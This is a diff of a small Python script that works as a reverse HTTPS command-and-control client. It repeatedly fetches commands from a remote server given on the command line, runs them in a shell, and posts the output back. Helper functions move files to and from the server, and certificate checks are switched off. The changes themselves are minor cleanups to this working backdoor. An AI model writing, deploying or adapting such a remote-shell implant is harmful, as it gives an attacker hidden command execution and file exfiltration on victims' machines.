@@ -47,8 +47,6 @@ __email__ = "dggsoares at gmail"
 __status__ = "Development"
 __date__ = 20190411
 
-URL = ''
-
 
 def get(command, session, base_url):
     get, path = command.split('&')
@@ -71,6 +69,7 @@ def put(command, session, base_url):
         for chunk in post_response.iter_content(chunk_size=128):
             local_file.write(chunk)
 
+
 def spawn_shell(command, session, base_url):
     CMD = subprocess.Popen(command,
                            shell=True,
@@ -81,13 +80,13 @@ def spawn_shell(command, session, base_url):
     session.post(url=base_url, data=CMD.stdout.read())
     session.post(url=base_url, data=CMD.stderr.read())
 
+
 def main(args):
     base_url = f'https://{args.server}:{args.port}'
     session = requests.Session()
-    session.verify = False
 
     while True:
-        r = session.get(base_url)
+        r = session.get(base_url, verify=False)
         command = r.text
 
         if 'quit' in command:
